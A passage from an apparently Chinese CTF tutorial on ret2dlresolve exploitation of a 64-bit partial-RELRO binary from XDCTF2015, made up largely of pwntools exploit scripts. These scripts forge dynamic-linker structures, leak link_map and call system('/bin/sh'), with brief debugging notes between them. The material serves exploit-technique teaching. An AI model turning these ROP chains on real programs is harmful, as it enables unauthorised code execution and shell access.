<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
<span class=n>link_map_addr</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>8</span><span class=p>))</span>
<span class=nb>print</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=n>link_map_addr</span><span class=p>))</span>


<span class=c1># set l-&gt;l_info[VERSYMIDX(DT_VERSYM)] =  NULL</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_64&quot;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>offset</span><span class=o>*</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>csu</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=mi>0</span><span class=p>,</span><span class=n>link_map_addr</span><span class=o>+</span><span class=mh>0x1c8</span><span class=p>,</span><span class=mi>8</span><span class=p>))</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>vuln_addr</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s2>&quot;a&quot;</span><span class=o>*</span><span class=p>(</span><span class=mi>256</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>))</span>


<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_64&quot;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>offset</span><span class=o>*</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x00000000004007a3</span><span class=p>)</span> <span class=c1># 0x00000000004007a3: pop rdi; ret; </span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>bin_sh_addr</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>resolve_call</span><span class=p>)</span>
<span class=c1># rop.raw(&#39;a&#39;*(256-len(rop.chain())))</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
<span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></div> <p>然鹅，还是崩溃。但这次比较好的是，确实已经执行到了 system 函数。通过调试，我们可以发现，system 函数在进一步调用 execve 时出现了问题</p> <div class=highlight><pre><span></span><code> ► 0x7f7f3f74d3ec &lt;do_system+1180&gt;       call   execve &lt;execve&gt;
        path: 0x7f7f3f8b20fa ◂— 0x68732f6e69622f /* &#39;/bin/sh&#39; */
        argv: 0x7ffe63677000 —▸ 0x7f7f3f8b20ff ◂— 0x2074697865006873 /* &#39;sh&#39; */
        envp: 0x7ffe636770a8 ◂— 0x10000
</code></pre></div> <p>即环境变量的地址指向了一个莫名的地址，这应该是我们在进行 ROP 的时候破坏了栈上的数据。那我们可以调整调整，使其为 NULL 或者尽可能不破坏原有的数据。这里我们选择使其为 NULL。</p> <p>首先，我们可以把读伪造的数据和 /bin/sh 部分的 rop 合并起来，以减少 ROP 的次数</p> <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
<span class=c1># context.log_level=&quot;debug&quot;</span>
<span class=c1># context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]</span>
<span class=n>context</span><span class=o>.</span><span class=n>arch</span><span class=o>=</span><span class=s2>&quot;amd64&quot;</span>
<span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_64&quot;</span><span class=p>)</span>
<span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_64&quot;</span><span class=p>)</span>

<span class=n>bss_addr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>bss</span><span class=p>()</span>
<span class=n>csu_front_addr</span> <span class=o>=</span> <span class=mh>0x400780</span>
<span class=n>csu_end_addr</span> <span class=o>=</span> <span class=mh>0x40079A</span>
<span class=n>vuln_addr</span> <span class=o>=</span> <span class=mh>0x400637</span>

<span class=k>def</span> <span class=nf>csu</span><span class=p>(</span><span class=n>rbx</span><span class=p>,</span> <span class=n>rbp</span><span class=p>,</span> <span class=n>r12</span><span class=p>,</span> <span class=n>r13</span><span class=p>,</span> <span class=n>r14</span><span class=p>,</span> <span class=n>r15</span><span class=p>):</span>
    <span class=c1># pop rbx, rbp, r12, r13, r14, r15</span>
    <span class=c1># rbx = 0</span>
    <span class=c1># rbp = 1, enable not to jump</span>
    <span class=c1># r12 should be the function that you want to call</span>
    <span class=c1># rdi = edi = r13d</span>
    <span class=c1># rsi = r14</span>
    <span class=c1># rdx = r15</span>
    <span class=n>payload</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>csu_end_addr</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>rbx</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>rbp</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r12</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r13</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r14</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r15</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>csu_front_addr</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mh>0x38</span>
    <span class=k>return</span> <span class=n>payload</span>


<span class=k>def</span> <span class=nf>ret2dlresolve_x64</span><span class=p>(</span><span class=n>elf</span><span class=p>,</span> <span class=n>store_addr</span><span class=p>,</span> <span class=n>func_name</span><span class=p>,</span> <span class=n>resolve_addr</span><span class=p>):</span>
    <span class=n>plt0</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.plt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>

    <span class=n>rel_plt</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.rela.plt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>
    <span class=n>relaent</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>dynamic_value_by_tag</span><span class=p>(</span><span class=s2>&quot;DT_RELAENT&quot;</span><span class=p>)</span> <span class=c1># reloc entry size</span>

    <span class=n>dynsym</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.dynsym&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>
    <span class=n>syment</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>dynamic_value_by_tag</span><span class=p>(</span><span class=s2>&quot;DT_SYMENT&quot;</span><span class=p>)</span> <span class=c1># symbol entry size</span>

    <span class=n>dynstr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.dynstr&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>


    <span class=c1># construct fake function string</span>
    <span class=n>func_string_addr</span> <span class=o>=</span> <span class=n>store_addr</span>
    <span class=n>resolve_data</span> <span class=o>=</span> <span class=n>func_name</span> <span class=o>+</span> <span class=s2>&quot;</span><span class=se>\x00</span><span class=s2>&quot;</span>

    <span class=c1># construct fake symbol</span>
    <span class=n>symbol_addr</span> <span class=o>=</span> <span class=n>store_addr</span><span class=o>+</span><span class=nb>len</span><span class=p>(</span><span class=n>resolve_data</span><span class=p>)</span>
    <span class=n>offset</span> <span class=o>=</span> <span class=n>symbol_addr</span> <span class=o>-</span> <span class=n>dynsym</span>
    <span class=n>pad</span> <span class=o>=</span> <span class=n>syment</span> <span class=o>-</span> <span class=n>offset</span> <span class=o>%</span> <span class=n>syment</span> <span class=c1># align syment size</span>
    <span class=n>symbol_addr</span> <span class=o>=</span> <span class=n>symbol_addr</span><span class=o>+</span><span class=n>pad</span>
    <span class=n>symbol</span> <span class=o>=</span> <span class=n>p32</span><span class=p>(</span><span class=n>func_string_addr</span><span class=o>-</span><span class=n>dynstr</span><span class=p>)</span><span class=o>+</span><span class=n>p8</span><span class=p>(</span><span class=mh>0x12</span><span class=p>)</span><span class=o>+</span><span class=n>p8</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p16</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
    <span class=n>symbol_index</span> <span class=o>=</span> <span class=p>(</span><span class=n>symbol_addr</span> <span class=o>-</span> <span class=n>dynsym</span><span class=p>)</span><span class=o>/</span><span class=mi>24</span>
    <span class=n>resolve_data</span> <span class=o>+=</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=n>pad</span>
    <span class=n>resolve_data</span> <span class=o>+=</span> <span class=n>symbol</span>

    <span class=c1># construct fake reloc </span>
    <span class=n>reloc_addr</span> <span class=o>=</span> <span class=n>store_addr</span><span class=o>+</span><span class=nb>len</span><span class=p>(</span><span class=n>resolve_data</span><span class=p>)</span>
    <span class=n>offset</span> <span class=o>=</span> <span class=n>reloc_addr</span> <span class=o>-</span> <span class=n>rel_plt</span>
    <span class=n>pad</span> <span class=o>=</span> <span class=n>relaent</span> <span class=o>-</span> <span class=n>offset</span> <span class=o>%</span> <span class=n>relaent</span> <span class=c1># align relaent size</span>
    <span class=n>reloc_addr</span> <span class=o>+=</span><span class=n>pad</span>
    <span class=n>reloc_index</span> <span class=o>=</span> <span class=p>(</span><span class=n>reloc_addr</span><span class=o>-</span><span class=n>rel_plt</span><span class=p>)</span><span class=o>/</span><span class=mi>24</span>
    <span class=n>rinfo</span> <span class=o>=</span> <span class=p>(</span><span class=n>symbol_index</span><span class=o>&lt;&lt;</span><span class=mi>32</span><span class=p>)</span> <span class=o>|</span> <span class=mi>7</span>
    <span class=n>write_reloc</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>resolve_addr</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>rinfo</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
    <span class=n>resolve_data</span> <span class=o>+=</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=n>pad</span>
    <span class=n>resolve_data</span> <span class=o>+=</span><span class=n>write_reloc</span>

    <span class=n>resolve_call</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>plt0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>reloc_index</span><span class=p>)</span>
    <span class=k>return</span> <span class=n>resolve_data</span><span class=p>,</span> <span class=n>resolve_call</span>


<span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Welcome to XDCTF2015~!</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
<span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>io</span><span class=p>)</span>

<span class=n>store_addr</span> <span class=o>=</span> <span class=n>bss_addr</span><span class=o>+</span><span class=mh>0x100</span>
<span class=n>sh</span> <span class=o>=</span> <span class=s2>&quot;/bin/sh</span><span class=se>\x00</span><span class=s2>&quot;</span>

<span class=c1># construct fake string, symbol, reloc.modify .dynstr pointer in .dynamic section to a specific location</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_64&quot;</span><span class=p>)</span>
<span class=n>offset</span> <span class=o>=</span> <span class=mi>112</span><span class=o>+</span><span class=mi>8</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>offset</span><span class=o>*</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
<span class=n>resolve_data</span><span class=p>,</span> <span class=n>resolve_call</span> <span class=o>=</span> <span class=n>ret2dlresolve_x64</span><span class=p>(</span><span class=n>elf</span><span class=p>,</span> <span class=n>store_addr</span><span class=p>,</span> <span class=s2>&quot;system&quot;</span><span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s2>&quot;write&quot;</span><span class=p>])</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>csu</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=mi>0</span><span class=p>,</span><span class=n>store_addr</span><span class=p>,</span><span class=nb>len</span><span class=p>(</span><span class=n>resolve_data</span><span class=p>)</span><span class=o>+</span><span class=nb>len</span><span class=p>(</span><span class=n>sh</span><span class=p>)))</span>  
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>vuln_addr</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s2>&quot;a&quot;</span><span class=o>*</span><span class=p>(</span><span class=mi>256</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=k>assert</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span><span class=o>&lt;=</span><span class=mi>256</span><span class=p>)</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
<span class=c1># send resolve data</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>resolve_data</span><span class=o>+</span><span class=n>sh</span><span class=p>)</span>
<span class=n>bin_sh_addr</span> <span class=o>=</span> <span class=n>store_addr</span><span class=o>+</span><span class=nb>len</span><span class=p>(</span><span class=n>resolve_data</span><span class=p>)</span>


<span class=c1># rop = ROP(&quot;./main_partial_relro_64&quot;)</span>
<span class=c1># rop.raw(offset*&#39;a&#39;)</span>
<span class=c1># sh = &quot;/bin/sh\x00&quot;</span>
<span class=c1># bin_sh_addr = store_addr+len(resolve_data)</span>
<span class=c1># rop.raw(csu(0, 1 ,elf.got[&#39;read&#39;],0,bin_sh_addr,len(sh)))</span>
<span class=c1># rop.raw(vuln_addr)</span>
<span class=c1># rop.raw(&quot;a&quot;*(256-len(rop.chain())))</span>
<span class=c1># io.send(rop.chain())</span>
<span class=c1># io.send(sh)</span>


<span class=c1># leak link_map addr</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_64&quot;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>offset</span><span class=o>*</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>csu</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;write&#39;</span><span class=p>],</span><span class=mi>1</span><span class=p>,</span><span class=mh>0x601008</span><span class=p>,</span><span class=mi>8</span><span class=p>))</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>vuln_addr</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s2>&quot;a&quot;</span><span class=o>*</span><span class=p>(</span><span class=mi>256</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
<span class=n>link_map_addr</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>8</span><span class=p>))</span>
<span class=nb>print</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=n>link_map_addr</span><span class=p>))</span>


<span class=c1># set l-&gt;l_info[VERSYMIDX(DT_VERSYM)] =  NULL</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_64&quot;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>offset</span><span class=o>*</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>csu</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=mi>0</span><span class=p>,</span><span class=n>link_map_addr</span><span class=o>+</span><span class=mh>0x1c8</span><span class=p>,</span><span class=mi>8</span><span class=p>))</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>vuln_addr</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s2>&quot;a&quot;</span><span class=o>*</span><span class=p>(</span><span class=mi>256</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>))</span>


<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_64&quot;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>offset</span><span class=o>*</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x00000000004007a3</span><span class=p>)</span> <span class=c1># 0x00000000004007a3: pop rdi; ret; </span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>bin_sh_addr</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>resolve_call</span><span class=p>)</span>
<span class=c1># rop.raw(&#39;a&#39;*(256-len(rop.chain())))</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
<span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></div> <p>这时，再次尝试一下，发现</p> <div class=highlight><pre><span></span><code> ► 0x7f5a187703ec &lt;do_system+1180&gt;       call   execve &lt;execve&gt;
        path: 0x7f5a188d50fa ◂— 0x68732f6e69622f /* &#39;/bin/sh&#39; */
        argv: 0x7fff68270410 —▸ 0x7f5a188d50ff ◂— 0x2074697865006873 /* &#39;sh&#39; */
        envp: 0x7fff68270538 ◂— 0x6161616100000000
</code></pre></div> <p>这时候 envp 被污染的数据就只有 0x61 了，即我们填充的数据 'a'。那就好办了，我们只需要把所有的 pad 都替换为 <code>\x00</code> 即可。</p> <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
<span class=c1># context.log_level=&quot;debug&quot;</span>
<span class=c1># context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]</span>
<span class=n>context</span><span class=o>.</span><span class=n>arch</span><span class=o>=</span><span class=s2>&quot;amd64&quot;</span>
<span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_64&quot;</span><span class=p>)</span>
<span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_64&quot;</span><span class=p>)</span>

<span class=n>bss_addr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>bss</span><span class=p>()</span>
<span class=n>csu_front_addr</span> <span class=o>=</span> <span class=mh>0x400780</span>
<span class=n>csu_end_addr</span> <span class=o>=</span> <span class=mh>0x40079A</span>
<span class=n>vuln_addr</span> <span class=o>=</span> <span class=mh>0x400637</span>

<span class=k>def</span> <span class=nf>csu</span><span class=p>(</span><span class=n>rbx</span><span class=p>,</span> <span class=n>rbp</span><span class=p>,</span> <span class=n>r12</span><span class=p>,</span> <span class=n>r13</span><span class=p>,</span> <span class=n>r14</span><span class=p>,</span> <span class=n>r15</span><span class=p>):</span>
    <span class=c1># pop rbx, rbp, r12, r13, r14, r15</span>
    <span class=c1># rbx = 0</span>
    <span class=c1># rbp = 1, enable not to jump</span>
    <span class=c1># r12 should be the function that you want to call</span>
    <span class=c1># rdi = edi = r13d</span>
    <span class=c1># rsi = r14</span>
    <span class=c1># rdx = r15</span>
    <span class=n>payload</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>csu_end_addr</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>rbx</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>rbp</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r12</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r13</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r14</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r15</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>csu_front_addr</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span> <span class=o>*</span> <span class=mh>0x38</span>
    <span class=k>return</span> <span class=n>payload</span>


<span class=k>def</span> <span class=nf>ret2dlresolve_x64</span><span class=p>(</span><span class=n>elf</span><span class=p>,</span> <span class=n>store_addr</span><span class=p>,</span> <span class=n>func_name</span><span class=p>,</span> <span class=n>resolve_addr</span><span class=p>):</span>
    <span class=n>plt0</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.plt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>

    <span class=n>rel_plt</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.rela.plt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>
    <span class=n>relaent</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>dynamic_value_by_tag</span><span class=p>(</span><span class=s2>&quot;DT_RELAENT&quot;</span><span class=p>)</span> <span class=c1># reloc entry size</span>

    <span class=n>dynsym</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.dynsym&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>
    <span class=n>syment</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>dynamic_value_by_tag</span><span class=p>(</span><span class=s2>&quot;DT_SYMENT&quot;</span><span class=p>)</span> <span class=c1># symbol entry size</span>

    <span class=n>dynstr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.dynstr&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>


    <span class=c1># construct fake function string</span>
    <span class=n>func_string_addr</span> <span class=o>=</span> <span class=n>store_addr</span>
    <span class=n>resolve_data</span> <span class=o>=</span> <span class=n>func_name</span> <span class=o>+</span> <span class=s2>&quot;</span><span class=se>\x00</span><span class=s2>&quot;</span>

    <span class=c1># construct fake symbol</span>
    <span class=n>symbol_addr</span> <span class=o>=</span> <span class=n>store_addr</span><span class=o>+</span><span class=nb>len</span><span class=p>(</span><span class=n>resolve_data</span><span class=p>)</span>
    <span class=n>offset</span> <span class=o>=</span> <span class=n>symbol_addr</span> <span class=o>-</span> <span class=n>dynsym</span>
    <span class=n>pad</span> <span class=o>=</span> <span class=n>syment</span> <span class=o>-</span> <span class=n>offset</span> <span class=o>%</span> <span class=n>syment</span> <span class=c1># align syment size</span>
    <span class=n>symbol_addr</span> <span class=o>=</span> <span class=n>symbol_addr</span><span class=o>+</span><span class=n>pad</span>
    <span class=n>symbol</span> <span class=o>=</span> <span class=n>p32</span><span class=p>(</span><span class=n>func_string_addr</span><span class=o>-</span><span class=n>dynstr</span><span class=p>)</span><span class=o>+</span><span class=n>p8</span><span class=p>(</span><span class=mh>0x12</span><span class=p>)</span><span class=o>+</span><span class=n>p8</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p16</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
    <span class=n>symbol_index</span> <span class=o>=</span> <span class=p>(</span><span class=n>symbol_addr</span> <span class=o>-</span> <span class=n>dynsym</span><span class=p>)</span><span class=o>/</span><span class=mi>24</span>
    <span class=n>resolve_data</span> <span class=o>+=</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=o>*</span><span class=n>pad</span>
    <span class=n>resolve_data</span> <span class=o>+=</span> <span class=n>symbol</span>

    <span class=c1># construct fake reloc </span>
    <span class=n>reloc_addr</span> <span class=o>=</span> <span class=n>store_addr</span><span class=o>+</span><span class=nb>len</span><span class=p>(</span><span class=n>resolve_data</span><span class=p>)</span>
    <span class=n>offset</span> <span class=o>=</span> <span class=n>reloc_addr</span> <span class=o>-</span> <span class=n>rel_plt</span>
    <span class=n>pad</span> <span class=o>=</span> <span class=n>relaent</span> <span class=o>-</span> <span class=n>offset</span> <span class=o>%</span> <span class=n>relaent</span> <span class=c1># align relaent size</span>
    <span class=n>reloc_addr</span> <span class=o>+=</span><span class=n>pad</span>
    <span class=n>reloc_index</span> <span class=o>=</span> <span class=p>(</span><span class=n>reloc_addr</span><span class=o>-</span><span class=n>rel_plt</span><span class=p>)</span><span class=o>/</span><span class=mi>24</span>
    <span class=n>rinfo</span> <span class=o>=</span> <span class=p>(</span><span class=n>symbol_index</span><span class=o>&lt;&lt;</span><span class=mi>32</span><span class=p>)</span> <span class=o>|</span> <span class=mi>7</span>
    <span class=n>write_reloc</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>resolve_addr</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>rinfo</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
    <span class=n>resolve_data</span> <span class=o>+=</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=o>*</span><span class=n>pad</span>
    <span class=n>resolve_data</span> <span class=o>+=</span><span class=n>write_reloc</span>

